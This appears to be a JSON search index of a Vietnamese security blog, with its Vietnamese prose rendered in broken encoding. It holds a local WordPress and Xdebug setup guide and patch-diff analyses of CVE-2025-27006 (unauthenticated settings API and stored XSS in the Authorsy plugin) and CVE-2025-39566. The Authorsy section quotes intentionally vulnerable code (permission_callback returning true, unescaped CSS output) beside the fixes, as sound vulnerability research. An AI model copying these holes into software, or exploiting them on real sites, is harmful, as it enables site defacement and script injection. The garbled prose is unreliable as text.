\u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Authorsy c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.0.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\nCVE ID: CVE-2025-27006 Product: WordPress Authorsy Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u0026lt;= 1.0.5 CVSS severity: Medium (6.5) OWASP Top 10: A1: Broken Access Control Required Privilege: Subscriber Trong m√¥ t·∫£ y√™u c·∫ßu ƒë·∫∑c quy·ªÅn Subscriber nh∆∞ng th·ª±c ra c√≥ th·ªÉ khai th√°c Unauthenticated. {: .prompt-info }\nRequirements Local WordPress and Debugging Authorsy: v1.0.5(vul) v√† v1.0.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng c√≥ ch·ª©c nƒÉng t√πy ch·ªânh CSS, l∆∞u d·ªØ li·ªáu trong wp_options v√† ch√®n tr·ª±c ti·∫øp v√†o \u0026lt;style\u0026gt; tr√™n trang. Tuy nhi√™n, ng∆∞·ªùi d√πng c√≥ th·ªÉ t∆∞∆°ng t√°c v·ªõi API ƒë·ªÉ ch·ªânh s·ª≠a d·ªØ li·ªáu CSS m√† kh√¥ng b·ªã ki·ªÉm so√°t quy·ªÅn, d·∫´n ƒë·∫øn nguy c∆° Broken Access Control v√† c√≥ th·ªÉ XSS n·∫øu ch√®n payload ƒë·ªôc h·∫°i.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file core/settings/api-settings.php v√† core/enqueue-inline/enqueue-inline.php\nFile core/enqueue-inline/enqueue-inline.php\npublic function custom_inline_css() { $custom_css = \u0026#39;\u0026#39;; // other logic $ea_custom_css = authorsy_get_option(\u0026#39;ea_custom_css\u0026#39;); if(is_single()){ $custom_css.= $ea_custom_css; } $custom_css .= \u0026#34; :root { --ea-color-main: $primary_color; } // other custom \u0026#34; wp_add_inline_style(\u0026#39;authorsy-custom-css\u0026#39;, $custom_css); } {: file=\u0026ldquo;core/enqueue-inline/enqueue-inline.php v1.0.5\u0026rdquo; }\nD·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng tr∆∞·ªõc khi th√™m v√†o HTML kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t, kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá =\u0026gt; d·ªÖ b·ªã XSS.\npublic function custom_inline_css() { $custom_css = \u0026#39;\u0026#39;; // other logic $ea_custom_css = authorsy_get_option(\u0026#39;ea_custom_css\u0026#39;); if(is_single() \u0026amp;\u0026amp; !empty($ea_custom_css)){ // Additional sanitization for output to prevent XSS $ea_custom_css = wp_strip_all_tags($ea_custom_css); $ea_custom_css = esc_html($ea_custom_css); $custom_css.= $ea_custom_css; } $custom_css .= \u0026#34; :root { --ea-color-main: $primary_color; } // other custom \u0026#34; wp_add_inline_style(\u0026#39;authorsy-custom-css\u0026#39;, $custom_css); } {: file=\u0026ldquo;core/enqueue-inline/enqueue-inline.php v1.0.5\u0026rdquo; }\nB·∫£n v√° b·∫£o v·ªá d·ªØ li·ªáu b·∫±ng sanitize + escape, ƒë·ªìng th·ªùi ki·ªÉm tra CSS c√≥ t·ªìn t·∫°i tr∆∞·ªõc khi ch√®n.\nFile core/settings/api-settings.php\nclass Api_Settings extends Api { protected $namespace = \u0026#39;authorsy/v1\u0026#39;; protected $rest_base = \u0026#39;settings\u0026#39;; public function register_routes() { register_rest_route( $this-\u0026gt;namespace, $this-\u0026gt;rest_base, [ [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;get_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return true; }, ], [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::EDITABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;update_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return true; }, ], ] ); } public function get_settings() { // other logic } public function update_settings( $request ) { // other logic } } {: file=\u0026ldquo;core/settings/api-settings.php v1.0.5\u0026rdquo; }\n·ª®ng d·ª•ng ƒëƒÉng k√Ω REST API b·∫±ng register_rest_route nh∆∞ng kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p (permission_callback lu√¥n true) =\u0026gt; Ai c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng API n√†y.\nclass Api_Settings extends Api { protected $namespace = \u0026#39;authorsy/v1\u0026#39;; protected $rest_base = \u0026#39;settings\u0026#39;; public function register_routes() { register_rest_route( $this-\u0026gt;namespace, $this-\u0026gt;rest_base, [ [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;get_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return current_user_can(\u0026#39;manage_options\u0026#39;); }, ], [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::EDITABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;update_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return current_user_can(\u0026#39;manage_options\u0026#39;); }, ], ] ); } public function get_settings() { // other logic } public function update_settings( $request ) { // other logic } } {: file=\u0026ldquo;core/settings/api-settings.php v1.0.5\u0026rdquo; }\npermission callback ƒë∆∞·ª£c v√°, ch·ªâ admin qu·∫£n l√Ω ƒë∆∞·ª£c settings, b·∫£o v·ªá ch·ªëng Broken Access Control v√† gi√°n ti·∫øp gi·∫£m nguy c∆° XSS.\nHow it work? class Enqueue_Inline { public function init() { add_action(\u0026#39;wp_head\u0026#39;, array($this, \u0026#39;custom_inline_css\u0026#39;)); } // other logic public function custom_inline_css() { $custom_css = \u0026#39;\u0026#39;; // other logic $primary_color = authorsy_get_option(\u0026#39;primary_color\u0026#39;); $ea_custom_css = authorsy_get_option(\u0026#39;ea_custom_css\u0026#39;); if(is_single()){ $custom_css.= $ea_custom_css; } $custom_css .= \u0026#34; :root { --ea-color-main: $primary_color; } // other custom \u0026#34; wp_add_inline_style(\u0026#39;authorsy-custom-css\u0026#39;, $custom_css); } } custom_inline_css ƒë∆∞·ª£c d√πng l√†m callback cho hook wp_head. Nghƒ©a l√† khi WP render ph·∫ßn \u0026lt;head\u0026gt; c·ªßa trang (ngay tr∆∞·ªõc \u0026lt;/head\u0026gt;), WP s·∫Ω ch·∫°y custom_inline_css() ƒë·ªÉ th√™m CSS.\nTrong custom_inline_css chu·ªói $custom_css ƒë∆∞·ª£c t·∫°o, d√πng ƒë·ªÉ ch·ª©a:\nN·ªôi dung c√°c bi·∫øn c·∫•u h√¨nh l·∫•y t·ª´ authorsy_get_option() v√† m·ªôt s·ªë logic kh√°c. Ch√∫ng ƒë∆∞·ª£c n·ªëi, th√™m v√†o $custom_css tr∆∞·ªõc khi wp_add_inline_style() ƒë∆∞·ª£c g·ªçi ƒë·ªÉ th√™m v√†o \u0026lt;head\u0026gt;. 